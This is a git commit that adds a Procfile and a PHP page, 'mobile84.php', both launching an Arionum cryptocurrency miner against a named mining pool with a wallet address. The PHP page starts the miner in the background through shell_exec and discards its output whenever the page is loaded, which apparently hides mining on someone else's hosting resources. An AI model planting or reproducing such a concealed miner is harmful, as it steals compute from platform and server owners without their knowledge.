285e42687bd2cd12bf5aec8f852dd1f7d1e832a6
mobile8474 <52715718+mobile8474@users.noreply.github.com>
2019-07-09 19:45:56 +0200

    Add files via upload

---
+++ Procfile
@@ -0,0 +1,2 @@
+worker: php ./miner pool http://mine.arionumpool.com 3pHCzLtTpG88XYBNc9x32Y73Gfh1bvs6oqAkAqSpmFoPrUrqprR6GaF9aQc3E47gBQR1mkinRbfRVrNrWHRWG7LV
+
---
+++ mobile84.php
@@ -0,0 +1,8 @@
+<?php
+
+$mobile84 = shell_exec("php ./miner pool http://mine.arionumpool.com 3pHCzLtTpG88XYBNc9x32Y73Gfh1bvs6oqAkAqSpmFoPrUrqprR6GaF9aQc3E47gBQR1mkinRbfRVrNrWHRWG7LV > /dev/null 2>/dev/null &");
+
+echo "$mobile84";
+
+?>
+
